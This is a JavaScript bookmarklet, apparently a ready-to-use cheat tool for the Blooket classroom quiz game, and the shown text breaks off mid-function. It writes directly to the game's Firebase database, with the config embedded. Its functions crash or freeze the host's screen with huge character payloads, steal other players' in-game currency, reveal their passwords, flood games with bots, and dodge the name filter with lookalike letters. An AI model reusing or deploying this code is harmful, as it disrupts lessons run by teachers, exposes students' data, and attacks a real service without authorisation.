/* Blooket Bot — console / bookmarklet script */
(function () {
  'use strict';

  // ── Prevent double-load ──────────────────────────────────────────────────
  var existing = document.getElementById('__bb_root__');
  if (existing) { existing.style.display = 'flex'; return; }

  // ── API Origin ────────────────────────────────────────────────────────────
  var ORIGIN = (function () {
    if (typeof __API_ORIGIN__ !== 'undefined' && __API_ORIGIN__) return __API_ORIGIN__;
    var el = document.currentScript;
    if (el && el.src) { try { return new URL(el.src).origin; } catch (_) {} }
    var saved = localStorage.getItem('__bb_origin__');
    if (saved) return saved;
    var input = prompt('Enter your Blooket Bot site URL\n(e.g. https://my-app.vercel.app):');
    if (!input) return '';
    var clean = input.trim().replace(/\/$/, '');
    localStorage.setItem('__bb_origin__', clean);
    return clean;
  }());

  if (!ORIGIN) { alert('Blooket Bot: No API URL set. Reload the script to try again.'); return; }

  var JOIN_API = ORIGIN + '/api/blooket/join';

  // ── Firebase CDN ──────────────────────────────────────────────────────────
  var FB_VER = '10.12.0';
  var FB_APP_URL = 'https://www.gstatic.com/firebasejs/' + FB_VER + '/firebase-app.js';
  var FB_DB_URL  = 'https://www.gstatic.com/firebasejs/' + FB_VER + '/firebase-database.js';
  var FB_CFG = {
    apiKey:            'AIzaSyCA-cTOnX19f6LFnDVVsHXya3k6ByP_MnU',
    authDomain:        'blooket-2020.firebaseapp.com',
    projectId:         'blooket-2020',
    storageBucket:     'blooket-2020.appspot.com',
    messagingSenderId: '741533559105',
    appId:             '1:741533559105:web:b8cbb10e6123f2913519c0',
  };

  // ── State ─────────────────────────────────────────────────────────────────
  var bots     = [];
  var primary  = null;
  var gameData = {};
  var gameMode = '';
  var fbLib    = null;
  var spawning = false;

  // ── Helpers ───────────────────────────────────────────────────────────────
  var BLOOKS = ['Chick','Chicken','Cow','Dog','Cat','Bear','Fox','Owl','Deer','Wolf',
    'Panda','Ghost','Dragon','Alien','Rainbow Astronaut','King','Ninja','Witch',
    'Fairy','Unicorn','Mummy','Slime','Shark','Tiger'];

  function randBlook() { return BLOOKS[Math.random() * BLOOKS.length | 0]; }
  function randName(pfx) {
    var adj = ['Fast','Mega','Super','Ultra','Epic','Neon','Storm','Fire','Hyper','Dark'];
    var nn  = ['Shark','Tiger','Dragon','Eagle','Fox','Wolf','Hawk','Bear','Lion','Cobra'];
    var base = adj[Math.random()*adj.length|0]+nn[Math.random()*nn.length|0]+(Math.random()*99+1|0);
    return pfx ? pfx + base : base;
  }
  function coerce(v) { var n = Number(v); return Number.isFinite(n) ? n : v; }
  function makeLong(len) {
    var chars = ['\u200e','\u200f','\u200b','\u200c','\u200d','\u2060'];
    var r = '';
    for (var i = 0; i < len; i++) r += chars[Math.random() * chars.length | 0];
    return r;
  }
  function makeBig(text) {
    var r = '1'.repeat(100);
    for (var i = 0; i < 500; i++) { r += text + (i % 10 === 0 ? '\n\r' : ' '); }
    return r;
  }
  function floodText(name, text) {
    return name + ':' + Date.now() + Array(1700).fill(text + ' ').join('');
  }
  function getPlayers() {
    if (!gameData || !gameData.c) return [];
    return Object.keys(gameData.c);
  }
  function dbSet(db, path, val) {
    if (!db || !fbLib) return Promise.resolve();
    return fbLib.set(fbLib.ref(db, path), val);
  }
  function setUserVal(path, val) {
    if (!primary) return;
    return dbSet(primary.db, primary.code + '/c/' + primary.name + '/' + path, val);
  }
  function setTeamVal(path, val) {
    if (!primary) return;
    return dbSet(primary.db, primary.code + '/a/' + primary.name + '/' + path, val);
  }
  function bypassFilter(name) {
    var map = {a:'\u0430',e:'\u0435',o:'\u043e',p:'\u0440',c:'\u0441',y:'\u0443',
               A:'\u0410',E:'\u0415',O:'\u041e',B:'\u0412',C:'\u0421'};
    return name.split('').map(function(ch) { return map[ch] || ch; }).join('');
  }
  function esc(s) {
    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
  }

  // ── Cheats ────────────────────────────────────────────────────────────────
  // t: 'btn' | 'input' | 'sel' (player list) | 'sstat' (static select)
  var CHEATS = {
    Hack: [
      { t:'btn',   name:'Crash Host',               fn: function(b) { setUserVal('cr/t','t'); b.textContent='Crashing\u2026'; } },
      { t:'btn',   name:'Freeze Scoreboard',         fn: function(b) { var on=b.dataset.on!=='1'; b.dataset.on=on?'1':'0'; setUserVal(on?'tat/t':'tat',on?'t':'none'); b.textContent=on?'Unfreeze Scoreboard':'Freeze Scoreboard'; } },
      { t:'btn',   name:'Green Screen Host',         fn: function(b) { var on=b.dataset.on!=='1'; b.dataset.on=on?'1':'0'; if(on){var t='a'.repeat(63);for(var i=0;i<300000;i++){t+=String.fromCharCode(3655);if(i%61===0)t+=' ';}t+='a'.repeat(63);setUserVal('cr',t);}else setUserVal('cr',0);b.textContent=on?'Undo Green Screen':'Green Screen Host'; } },
      { t:'btn',   name:'Freeze w/ Password',        fn: function(b) { var on=b.dataset.on!=='1'; b.dataset.on=on?'1':'0'; setUserVal('p',on?makeLong(3000000):''); b.textContent=on?'Remove Freeze Password':'Freeze w/ Password'; } },
      { t:'input', name:'Set Crypto Amount',         fn: function(v) { setUserVal('cr',coerce(v)); } },
      { t:'input', name:'Set Password',              fn: function(v) { setUserVal('p',v); } },
      { t:'input', name:'Advertise on Host Screen',  fn: function(v) { setUserVal('cr',makeBig(v)); } },
      { t:'sel',   name:'Steal Crypto From',         fn: function(v) { var amt=prompt('How much crypto?'); if(amt) setUserVal('tat',v+':'+amt); } },
      { t:'sel',   name:"Get Player's Password",     fn: function(v) { var d=gameData.c&&gameData.c[v]; alert('Password for '+v+': '+(d&&d.p||'(none)')); } },
      { t:'sel',   name:'Flood Alert Box',           fn: function(v) { var txt=prompt('Text?'); if(txt) setUserVal('tat',floodText(v,txt)); } },
    ],
    Gold: [
      { t:'btn',   name:'Crash Host',               fn: function(b) { setUserVal('g/t','t'); b.textContent='Crashing\u2026'; } },
      { t:'btn',   name:'Freeze Scoreboard',         fn: function(b) { var on=b.dataset.on!=='1'; b.dataset.on=on?'1':'0'; setUserVal(on?'tat/t':'tat',on?'t':'none'); b.textContent=on?'Unfreeze Scoreboard':'Freeze Scoreboard'; } },
      { t:'btn',   name:'Max Gold (9,999,999)',      fn: function() { setUserVal('g',9999999); } },
      { t:'input', name:'Set Gold',                  fn: function(v) { setUserVal('g',coerce(v)); } },
      { t:'sel',   name:'Steal Gold From',           fn: function(v) { var amt=prompt('How much gold?'); if(amt) setUserVal('tat',v+':'+amt); } },
      { t:'sel',   name:"Set Player's Gold",         fn: function(v) { var amt=prompt('Set gold to?'); if(amt) setUserVal('tat',v+':swap:'+amt); } },
      { t:'input', name:'Flood Alert Box',           fn: function(v) { if(primary) setUserVal('tat',floodText(primary.name,v)); } },
    ],
    Candy: [
      { t:'btn',   name:'Crash Host',               fn: function(b) { setUserVal('g/t','t'); b.textContent='Crashing\u2026'; } },
      { t:'btn',   name:'Freeze Scoreboard',         fn: function(b) { var on=b.dataset.on!=='1'; b.dataset.on=on?'1':'0'; setUserVal(on?'tat/t':'tat',on?'t':'none'); b.textContent=on?'Unfreeze Scoreboard':'Freeze Scoreboard'; } },
      { t:'btn',   name:'Max Candy (9,999,999)',     fn: function() { setUserVal('g',9999999); } },
      { t:'input', name:'Set Candy',                 fn: function(v) { setUserVal('g',coerce(v)); } },
      { t:'sel',   name:'Steal Candy From',          fn: function(v) { var amt=prompt('How much candy?'); if(amt) setUserVal('tat',v+':'+amt); } },
      { t:'sel',   name:"Set Player's Candy",        fn: function(v) { var amt=prompt('Set candy to?'); if(amt) setUserVal('tat',v+':swap:'+amt); } },
      { t:'input', name:'Flood Alert Box',           fn: function(v) { if(primary) setUserVal('tat',floodText(primary.name,v)); } },
    ],
    'Defense 2': [
      { t:'btn',   name:'Crash Host',               fn: function(b) { setUserVal('d/t','t'); b.textContent='Crashing\u2026'; } },
      { t:'btn',   name:'Freeze Scoreboard',         fn: function(b) { var on=b.dataset.on!=='1'; b.dataset.on=on?'1':'0'; setUserVal(on?'r/toString':'r',on?'t':1); b.textContent=on?'Unfreeze Scoreboard':'Freeze Scoreboard'; } },
      { t:'input', name:'Set Damage',                fn: function(v) { setUserVal('d',coerce(v)); } },
      { t:'input', name:'Set Round',                 fn: function(v) { setUserVal('r',coerce(v)); } },
      { t:'input', name:'Flood Alert Box',           fn: function(v) { setUserVal('r',Date.now()+Array(1700).fill(v+' ').join('')); } },
    ],
    Fish: [
      { t:'btn',   name:'Freeze Scoreboard',         fn: function(b) { var on=b.dataset.on!=='1'; b.dataset.on=on?'1':'0'; setUserVal(on?'f/t':'f',on?'t':'Old Boot'); b.textContent=on?'Unfreeze Scoreboard':'Freeze Scoreboard'; } },
      { t:'btn',   name:'Activate Frenzy',           fn: function() { setUserVal('s',true); setUserVal('f','Frenzy'); } },
      { t:'btn',   name:'Max Weight (999,999)',      fn: function() { setUserVal('w',999999); } },
      { t:'input', name:'Set Weight',                fn: function(v) { setUserVal('w',coerce(v)); } },
      { t:'input', name:'Set Caught Fish',           fn: function(v) { setUserVal('f',v); } },
      { t:'input', name:'Send Distraction',          fn: function(v) { setUserVal('s',true); setUserVal('f',v); } },
    ],
    Pirate: [
      { t:'btn',   name:'Crash Host',               fn: function(b) { setUserVal('d/t','t'); b.textContent='Crashing\u2026'; } },
      { t:'btn',   name:'Freeze Scoreboard',         fn: function(b) { var on=b.dataset.on!=='1'; b.dataset.on=on?'1':'0'; setUserVal(on?'tat/t':'tat',on?'t':'none'); b.textContent=on?'Unfreeze Scoreboard':'Freeze Scoreboard'; } },
      { t:'btn',   name:'Max Doubloons (9,999,999)', fn: function() { setUserVal('d',9999999); } },
      { t:'input', name:'Set Doubloons',             fn: function(v) { setUserVal('d',coerce(v)); } },
      { t:'sel',   name:'Steal Doubloons From',      fn: function(v) { var amt=prompt('How many doubloons?'); if(amt) setUserVal('tat',v+':'+amt); } },
      { t:'input', name:'Flood Alert Box',           fn: function(v) { if(primary) setUserVal('tat',floodText(primary.name,v)); } },
    ],
    Dino: [
      { t:'btn',   name:'Crash Host',               fn: function(b) { setUserVal('f/t','t'); b.textContent='Crashing\u2026'; } },
      { t:'btn',   name:'Freeze Scoreboard',         fn: function(b) { var on=b.dataset.on!=='1'; b.dataset.on=on?'1':'0'; setUserVal(on?'tat/t':'tat',on?'t':'none'); b.textContent=on?'Unfreeze Scoreboard':'Freeze Scoreboard'; } },
      { t:'btn',   name:'Max Fossils (9,999,999)',   fn: function() { setUserVal('f',9999999); } },
      { t:'input', name:'Set Fossils',               fn: function(v) { setUserVal('f',coerce(v)); } },
      { t:'sstat', name:'Set Cheating Flag',         vals:['true','false'], fn: function(v) { setUserVal('ic',v); } },
      { t:'sel',   name:'Catch Player Cheating',     fn: function(v) { setUserVal('tat',v+':true'); } },
      { t:'input', name:'Flood Alert Box',           fn: function(v) { if(primary) setUserVal('tat',floodText(primary.name,v)); } },
    ],
    Cafe: [
      { t:'btn',   name:'Freeze Scoreboard',         fn: function(b) { var on=b.dataset.on!=='1'; b.dataset.on=on?'1':'0'; setUserVal(on?'tat/t':'tat',on?'t':'none'); b.textContent=on?'Unfreeze Scoreboard':'Freeze Scoreboard'; } },
      { t:'btn',   name:'Max Cash (9,999,999)',      fn: function() { setUserVal('ca',9999999); } },
      { t:'input', name:'Set Cash',                  fn: function(v) { setUserVal('ca',coerce(v)); } },
      { t:'input', name:'Set Upgrade (e.g. Cereal:1)', fn: function(v) { setUserVal('up',v); } },
      { t:'sel',   name:'Attack Player',             fn: function(v) { var a=prompt('Attack type?'); if(a) setUserVal('tat',v+':'+a); } },
      { t:'input', name:'Flood Alert Box',           fn: function(v) { setUserVal('up','a:'+Date.now()+Array(1700).fill(v+' ').join('')); } },
    ],
    Brawl: [
      { t:'btn',   name:'Crash Host',               fn: function(b) { setUserVal('xp/t','t'); b.textContent='Crashing\u2026'; } },
      { t:'btn',   name:'Freeze Scoreboard',         fn: function(b) { var on=b.dataset.on!=='1'; b.dataset.on=on?'1':'0'; setUserVal(on?'up/t':'up',on?'t':'Dark Energy:2'); b.textContent=on?'Unfreeze Scoreboard':'Freeze Scoreboard'; } },
      { t:'btn',   name:'Max XP (9,999,999)',        fn: function() { setUserVal('xp',9999999); } },
      { t:'input', name:'Set XP',                    fn: function(v) { setUserVal('xp',coerce(v)); } },
      { t:'sel',   name:'Steal XP From',             fn: function(v) { var amt=prompt('How much XP?'); if(amt) setUserVal('tat',v+':'+amt); } },
      { t:'input', name:'Set Upgrade (upgrade:level)', fn: function(v) { setUserVal('up',v); } },
      { t:'input', name:'Flood Alert Box',           fn: function(v) { setUserVal('up','__proto__:'+Date.now()+Array(1700).fill(v+' ').join('')); } },
    ],
    Racing: [
      { t:'btn',   name:'Freeze Scoreboard',         fn: function(b) { var on=b.dataset.on!=='1'; b.dataset.on=on?'1':'0'; setUserVal(on?'pr/toString':'pr',on?'t':0); b.textContent=on?'Unfreeze Scoreboard':'Freeze Scoreboard'; } },
      { t:'btn',   name:'Win Instantly (0 Questions)', fn: function() { setUserVal('pr',0); } },
      { t:'input', name:'Set Questions Left',        fn: function(v) { setUserVal('pr',coerce(v)); } },
      { t:'sel',   name:'Attack Player',             fn: function(v) { var a=prompt('Attack type (rocket, etc)?'); if(a) setUserVal('tat',v+':'+a); } },
      { t:'input', name:'Flood Alert Box',           fn: function(v) { setUserVal('pr',Date.now()+Array(1700).fill(v+' ').join('')); } },
    ],
    Classic: [
      { t:'btn',   name:'Freeze Question',           fn: function(b) { var on=b.dataset.on!=='1'; b.dataset.on=on?'1':'0'; setUserVal(on?'a/toString':'a',on?'t':1); b.textContent=on?'Unfreeze Question':'Freeze Question'; } },
      { t:'btn',   name:'Max Tokens (9,999,999)',    fn: function() { setUserVal('t',9999999); } },
      { t:'input', name:'Set Tokens',                fn: function(v) { setUserVal('t',coerce(v)); } },
      { t:'sel',   name:'Steal Tokens From',         fn: function(v) { var amt=prompt('How many tokens?'); if(amt) setUserVal('tat',v+':'+amt); } },
      { t:'input', name:'Flood Alert Box',           fn: function(v) { setUserVal('a',Date.now()+Array(1700).fill(v+' ').join('')); } },
    ],
    Royale: [
      { t:'btn',   name:'Send Crash Answer',         fn: function(b) { var on=b.dataset.on!=='1'; b.dataset.on=on?'1':'0'; if(primary) dbSet(primary.db,primary.code+'/a/'+primary.name+'/a/toString',on?'t':2); b.textContent=on?'Unsend Crash Answer':'Send Crash Answer'; } },
      { t:'btn',   name:'Freeze Scoreboard',         fn: function(b) { var on=b.dataset.on!=='1'; b.dataset.on=on?'1':'0'; setUserVal(on?'tat/t':'tat',on?'t':'none'); b.textContent=on?'Unfreeze Scoreboard':'Freeze Scoreboard'; } },
      { t:'btn',   name:'Max Eliminations (9,999)',  fn: function() { setUserVal('e',9999); } },
      { t:'input', name:'Set Eliminations',          fn: function(v) { setUserVal('e',coerce(v)); } },
      { t:'input', name:'Flood Alert Box',           fn: function(v) { if(primary) setUserVal('tat',floodText(primary.name,v)); } },
    ],
    Rush: [
      { t:'btn',   name:'Freeze Host Computer',      fn: function(b) { setUserVal('bs',1e307); b.textContent='Done!'; } },
      { t:'btn',   name:'Freeze Scoreboard',         fn: function(b) { var on=b.dataset.on!=='1'; b.dataset.on=on?'1':'0'; setUserVal(on?'d/toString':'d','t'); b.textContent=on?'Unfreeze Scoreboard':'Freeze Scoreboard'; } },
      { t:'btn',   name:'Max Blooks (9,999,999)',    fn: function() { setUserVal('bs',9999999); } },
      { t:'input', name:'Set Blooks',                fn: function(v) { setUserVal('bs',coerce(v)); } },
      { t:'input', name:'Set Defense',               fn: function(v) { setUserVal('d',coerce(v)); } },
      { t:'sel',   name:'Steal Blooks From',         fn: function(v) { var amt=prompt('How many blooks?'); if(amt) setUserVal('tat',v+':'+amt); } },
      { t:'input', name:'Advertise Text',            fn: function(v) { setUserVal('d',makeBig(v)); } },
    ],
    'Rush (Teams)': [
      { t:'btn',   name:'Freeze Host Computer',      fn: function(b) { setTeamVal('bs',1e307); b.textContent='Done!'; } },
      { t:'btn',   name:'Max Blooks (9,999,999)',    fn: function() { setTeamVal('bs',9999999); } },
      { t:'input', name:'Set Blooks',                fn: function(v) { setTeamVal('bs',coerce(v)); } },
      { t:'input', name:'Set Defense',               fn: function(v) { setTeamVal('d',coerce(v)); } },
    ],
    Factory: [
      { t:'btn',   name:'Freeze Scoreboard',         fn: function(b) { var on=b.dataset.on!=='1'; b.dataset.on=on?'1':'0'; setUserVal(on?'ca/toString':'ca',on?'t':0); b.textContent=on?'Unfreeze Scoreboard':'Freeze Scoreboard'; } },
      { t:'btn',   name:'Max Cash (9,999,999)',      fn: function() { setUserVal('ca',9999999); } },
      { t:'input', name:'Set Cash',                  fn: function(v) { setUserVal('ca',coerce(v)); } },
      { t:'sel',   name:'Steal Cash From',           fn: function(v) { var amt=prompt('How much cash?'); if(amt) setUserVal('tat',v+':'+amt); } },
      { t:'sstat', name:'Send Distraction',          vals:['dp'], fn: function(v) { setUserVal('tat',v); } },
      { t:'input', name:'Flood Alert Box',           fn: function(v) { if(primary) setUserVal('tat',floodText(primary.name,v)); } },
    ],
    Toy: [
      { t:'btn',   name:'Crash Host',               fn: function(b) { setUserVal('t/t','t'); b.textContent='Crashing\u2026'; } },
      { t:'btn',   name:'Freeze Scoreboard',         fn: function(b) { var on=b.dataset.on!=='1'; b.dataset.on=on?'1':'0'; setUserVal(on?'tat/t':'tat',on?'t':'none'); b.textContent=on?'Unfreeze Scoreboard':'Freeze Scoreboard'; } },
      { t:'btn',   name:'Max Toys (9,999,999)',      fn: function() { setUserVal('t',9999999); } },
      { t:'input', name:'Set Toys',                  fn: function(v) { setUserVal('t',coerce(v)); } },
      { t:'sel',   name:'Steal Toys From',           fn: function(v) { var amt=prompt('How many toys?'); if(amt) setUserVal('tat',v+':'+amt); } },
      { t:'sel',   name:"Set Player's Toys",         fn: function(v) { var amt=prompt('Set toys to?'); if(amt) setUserVal('tat',v+':swap:'+amt); } },
      { t:'input', name:'Flood Alert Box',           fn: function(v) { if(primary) setUserVal('tat',floodText(primary.name,v)); } },
    ],
  };

  var GLOBAL_CHEATS = [
    { t:'btn',   name:'Freeze Host (All Modes)',     fn: function(b) {
      var map={Hack:'cr',Gold:'g',Candy:'g','Defense 2':'d',Pirate:'d',Fish:'w',Brawl:'xp',Factory:'ca'};
      setUserVal(map[gameMode]||'cr', makeLong(150000));
      b.textContent='Freezing\u2026';
    }},
    { t:'sstat', name:'Set Blook', vals:BLOOKS,      fn: function(v) { setUserVal('b',v); } },
    { t:'input', name:'Set Banner',                  fn: function(v) { setUserVal('bg',v); } },
    { t:'btn',   name:'Reset API URL',               fn: function() { localStorage.removeItem('__bb_origin__'); alert('Cleared. Reload script to re-enter URL.'); } },
  ];

  // ── Styles ────────────────────────────────────────────────────────────────
  var style = document.createElement('style');
  style.textContent =
    '#__bb_root__{all:initial;position:fixed;bottom:20px;right:20px;z-index:2147483647;'+
    'display:flex;flex-direction:column;width:340px;max-height:90vh;'+
    'background:#fff;border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,.35);'+
    'font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;font-size:13px;color:#222;overflow:hidden;}'+
    '#__bb_root__ *{box-sizing:border-box;margin:0;padding:0;}'+
    '#__bb_hdr__{background:#e8a020;color:#fff;padding:10px 12px;'+
    'display:flex;align-items:center;justify-content:space-between;'+
    'cursor:move;user-select:none;border-radius:12px 12px 0 0;font-weight:700;font-size:14px;}'+
    '#__bb_hdr__ button{background:rgba(0,0,0,.2);border:none;color:#fff;'+
    'border-radius:6px;padding:2px 8px;cursor:pointer;font-size:13px;}'+
    '#__bb_tabs__{display:flex;border-bottom:1px solid #eee;}'+
    '#__bb_tabs__ button{flex:1;padding:8px 4px;border:none;background:#f7f7f7;'+
    'font-size:12px;cursor:pointer;font-weight:600;color:#666;transition:all .15s;}'+
    '#__bb_tabs__ button.bb-act{background:#fff;color:#e8a020;border-bottom:2px solid #e8a020;}'+
    '#__bb_body__{overflow-y:auto;flex:1;padding:10px;}'+
    '.bb-row{display:flex;gap:6px;margin-bottom:7px;}'+
    '.bb-inp{flex:1;border:1.5px solid #ddd;border-radius:6px;padding:6px 8px;font-size:12px;outline:none;}'+
    '.bb-inp:focus{border-color:#e8a020;}'+
    '.bb-btn{background:#e8a020;color:#fff;border:none;border-radius:6px;'+
    'padding:7px 12px;cursor:pointer;font-size:12px;font-weight:600;white-space:nowrap;}'+
    '.bb-btn:hover{background:#d4911a;}'+
    '.bb-btn.sm{padding:4px 8px;font-size:11px;}'+
    '.bb-btn.danger{background:#e84135;}.bb-btn.danger:hover{background:#c93328;}'+
    '.bb-btn.full{width:100%;margin-bottom:6px;}'+
    '.bb-btn:disabled{opacity:.5;cursor:default;}'+
    '.bb-lbl{font-size:11px;color:#888;margin-bottom:3px;font-weight:600;text-transform:uppercase;letter-spacing:.4px;}'+
    '.bb-sec{margin-bottom:12px;}'+
    '.bb-stitle{font-size:12px;font-weight:700;color:#e8a020;'+
    'border-bottom:1px solid #f0e0c0;padding-bottom:4px;margin-bottom:8px;}'+
    '.bb-card{background:#f9f9f9;border:1px solid #eee;border-radius:8px;'+
    'padding:7px 10px;margin-bottom:6px;display:flex;align-items:center;gap:6px;}'+
    '.bb-card-name{flex:1;font-size:12px;font-weight:600;}'+
    '.bb-stat{font-size:10px;padding:2px 6px;border-radius:10px;font-weight:600;}'+
    '.bb-stat.ok{background:#d1fae5;color:#065f46;}'+
    '.bb-stat.conn{background:#fef3c7;color:#92400e;}'+
    '.bb-stat.err{background:#fee2e2;color:#991b1b;}'+
    '.bb-cb{background:#f3f4f6;color:#222;border:1px solid #ddd;border-radius:6px;'+
    'padding:5px 8px;font-size:11px;cursor:pointer;width:100%;text-align:left;margin-bottom:4px;}'+
    '.bb-cb:hover{background:#e8a020;color:#fff;border-color:#e8a020;}'+
    '.bb-cir{display:flex;gap:4px;margin-bottom:4px;}'+
    '.bb-ci{flex:1;border:1px solid #ddd;border-radius:6px;padding:5px 7px;font-size:11px;}'+
    '.bb-sel{width:100%;border:1px solid #ddd;border-radius:6px;padding:5px 7px;font-size:11px;margin-bottom:4px;}'+
    '.bb-tag{display:inline-block;background:#fdf3e0;color:#c87a00;'+
    'border-radius:20px;font-size:10px;padding:1px 7px;margin:2px;font-weight:600;}'+
    '.bb-sbar{font-size:11px;color:#666;padding:4px 0 2px;min-height:18px;}'+
    '.bb-err{color:#e84135!important;}';
  document.head.appendChild(style);

  // ── Build panel ───────────────────────────────────────────────────────────
  var root = document.createElement('div');
  root.id = '__bb_root__';
  document.body.appendChild(root);

  function h(tag, attrs, children) {
    var el = document.createElement(tag);
    if (attrs) Object.keys(attrs).forEach(function(k) {
      if (k === 'className') el.className = attrs[k];
      else if (k === 'innerHTML') el.innerHTML = attrs[k];
      else el.setAttribute(k, attrs[k]);
    });
    if (children) children.forEach(function(c) { if (c) el.appendChild(c); });
    return el;
  }
  function t(text) { return document.createTextNode(text); }

  // Header
  var btnMin   = h('button', {}, [t('\u2014')]);
  var btnClose = h('button', {}, [t('\u2715')]);
  var hdr = h('div', {id:'__bb_hdr__'}, [
    h('span', {}, [t('\uD83E\uDD16 Blooket Bot')]),
    h('div', {style:'display:flex;gap:5px'}, [btnMin, btnClose]),
  ]);
  root.appendChild(hdr);

  // Tabs
  var tabBtns = ['join','bots','cheats'].map(function(k, i) {
    var b = h('button', {'data-tab': k}, [t(k === 'bots' ? 'Bots (0)' : k.charAt(0).toUpperCase()+k.slice(1))]);
    if (i === 0) b.className = 'bb-act';
    return b;
  });
  var tabBar = h('div', {id:'__bb_tabs__'}, tabBtns);
  root.appendChild(tabBar);

  // Body
  var body = h('div', {id:'__bb_body__'}, []);
  root.appendChild(body);

  // ── JOIN TAB ──────────────────────────────────────────────────────────────
  var inCode  = h('input', {className:'bb-inp', id:'bb_code', placeholder:'e.g. 123456'});
  var inNick  = h('input', {className:'bb-inp', id:'bb_nick', placeholder:'Your bot name'});
  var chkIncog  = h('input', {type:'checkbox', id:'bb_incog',  checked:''});
  var chkBypass = h('input', {type:'checkbox', id:'bb_bypass'});
  var chkFp     = h('input', {type:'checkbox', id:'bb_fp',     checked:''});
  var btnJoin = h('button', {className:'bb-btn full', id:'bb_join'}, [t('Join Game')]);
  var sbar    = h('div', {className:'bb-sbar', id:'bb_sbar'}, [t('Ready')]);
  var inPfx   = h('input', {className:'bb-inp', id:'bb_pfx',  placeholder:'Name prefix (opt)'});
  var inCnt   = h('input', {className:'bb-inp', id:'bb_cnt',  type:'number', min:'1', max:'50', value:'5', style:'width:60px;flex:none'});
  var btnFlood = h('button', {className:'bb-btn', id:'bb_flood'}, [t('Spawn')]);

  var joinTab = h('div', {id:'bb_tab_join'}, [
    h('div', {className:'bb-sec'}, [h('div', {className:'bb-lbl'}, [t('Game Code')]), inCode]),
    h('div', {className:'bb-sec'}, [h('div', {className:'bb-lbl'}, [t('Nickname')]), inNick]),
    h('div', {style:'display:flex;gap:10px;flex-wrap:wrap;margin-bottom:8px'}, [
      h('label', {style:'font-size:11px;display:flex;align-items:center;gap:4px;cursor:pointer'}, [chkIncog,  t(' Incognito (random blook)')]),
      h('label', {style:'font-size:11px;display:flex;align-items:center;gap:4px;cursor:pointer'}, [chkBypass, t(' Bypass Filter')]),
      h('label', {style:'font-size:11px;display:flex;align-items:center;gap:4px;cursor:pointer'}, [chkFp,     t(' First Place Switch')]),
    ]),
    btnJoin, sbar,
    h('hr', {style:'margin:10px 0;border:none;border-top:1px solid #eee'}),
    h('div', {className:'bb-stitle'}, [t('Flood Bots')]),
    h('div', {className:'bb-row'}, [inPfx, inCnt, btnFlood]),
  ]);
  body.appendChild(joinTab);

  // ── BOTS TAB ──────────────────────────────────────────────────────────────
  var btnKickAll = h('button', {className:'bb-btn danger full', id:'bb_kickall'}, [t('Kick All')]);
  var botList    = h('div', {id:'bb_botlist'});
  var botsTab    = h('div', {id:'bb_tab_bots', style:'display:none'}, [btnKickAll, botList]);
  body.appendChild(botsTab);

  // ── CHEATS TAB ────────────────────────────────────────────────────────────
  var cheatsContent = h('div', {id:'bb_cc', innerHTML:'<p style="color:#888;font-size:12px;padding:8px 0">Join a game first, then cheats appear here.</p>'});
  var cheatsTab = h('div', {id:'bb_tab_cheats', style:'display:none'}, [cheatsContent]);
  body.appendChild(cheatsTab);

  // ── Drag ──────────────────────────────────────────────────────────────────
  var dragging = false, ox = 0, oy = 0;
  hdr.addEventListener('mousedown', function(e) {
    if (e.target.tagName === 'BUTTON') return;
    dragging = true;
    var r = root.getBoundingClientRect();
    ox = e.clientX - r.left; oy = e.clientY - r.top;
    e.preventDefault();
  });
  document.addEventListener('mousemove', function(e) {
    if (!dragging) return;
    root.style.left = (e.clientX - ox) + 'px';
    root.style.top  = (e.clientY - oy) + 'px';
    root.style.right = 'auto'; root.style.bottom = 'auto';
  });
  document.addEventListener('mouseup', function() { dragging = false; });

  // ── Min / Close ───────────────────────────────────────────────────────────
  var minimized = false;
  btnMin.addEventListener('click', function() {
    minimized = !minimized;
    body.style.display = minimized ? 'none' : '';
    tabBar.style.display = minimized ? 'none' : '';
    btnMin.textContent = minimized ? '\u25a1' : '\u2014';
  });
  btnClose.addEventListener('click', function() { root.style.display = 'none'; });

  // ── Tab switching ─────────────────────────────────────────────────────────
  var TABS = { join: joinTab, bots: botsTab, cheats: cheatsTab };
  tabBar.addEventListener('click', function(e) {
    var btn = e.target;
    if (btn.tagName !== 'BUTTON') return;
    var tab = btn.getAttribute('data-tab');
    Object.keys(TABS).forEach(function(k) {
      TABS[k].style.display = k === tab ? '' : 'none';
    });
    tabBtns.forEach(function(b) { b.className = b.getAttribute('data-tab') === tab ? 'bb-act' : ''; });
    if (tab === 'cheats') renderCheats();
  });

  // ── Status / bot count ────────────────────────────────────────────────────
  function setStatus(msg, isErr) {
    sbar.textContent = msg;
    sbar.className = 'bb-sbar' + (isErr ? ' bb-err' : '');
  }
  function updateBotTab() {
    var n = bots.filter(function(b) { return b.status !== 'kicked'; }).length;
    tabBtns.forEach(function(b) { if (b.getAttribute('data-tab') === 'bots') b.textContent = 'Bots ('+n+')'; });
  }

  // ── Bot list ──────────────────────────────────────────────────────────────
  function renderBots() {
    var html = '';
    bots.forEach(function(bot, i) {
      if (bot.status === 'kicked') return;
      var sc = bot.status === 'connected' ? 'ok' : bot.status === 'connecting' ? 'conn' : 'err';
      html += '<div class="bb-card">'
        + '<span class="bb-card-name">'+esc(bot.name)+(bot.isPrimary?' \u2605':'')+'</span>'
        + '<span class="bb-stat '+sc+'">'+bot.status+'</span>'
        + '<button class="bb-btn sm" data-a="rename" data-i="'+i+'">\u270f</button>'
        + '<button class="bb-btn sm danger" data-a="kick" data-i="'+i+'">\u2715</button>'
        + '</div>';
    });
    botList.innerHTML = html || '<p style="color:#aaa;font-size:12px">No bots connected.</p>';
    updateBotTab();
  }

  botList.addEventListener('click', function(e) {
    var btn = e.target.closest('[data-a]');
    if (!btn) return;
    var i = parseInt(btn.getAttribute('data-i'));
    var bot = bots[i];
    if (!bot) return;
    if (btn.getAttribute('data-a') === 'kick') {
      kickBot(bot); bots[i].status = 'kicked'; renderBots();
    } else {
      var nm = prompt('New name for ' + bot.name + ':', bot.name);
      if (nm && bot.db) {
        var blk = bot.blook;
        bot.db.ref(bot.code + '/c/' + nm).set({ b: blk });
        bot.db.ref(bot.code + '/c/' + bot.name).remove();
        bots[i].name = nm;
        if (bot.isPrimary && primary) primary.name = nm;
        renderBots();
      }
    }
  });

  function kickBot(bot) {
    if (bot.db) try { bot.db.ref(bot.code + '/c/' + bot.name).remove(); } catch(_) {}
    if (bot.app) try { bot.app.delete(); } catch(_) {}
  }

  btnKickAll.addEventListener('click', function() {
    bots.forEach(function(b) { if (b.status !== 'kicked') kickBot(b); });
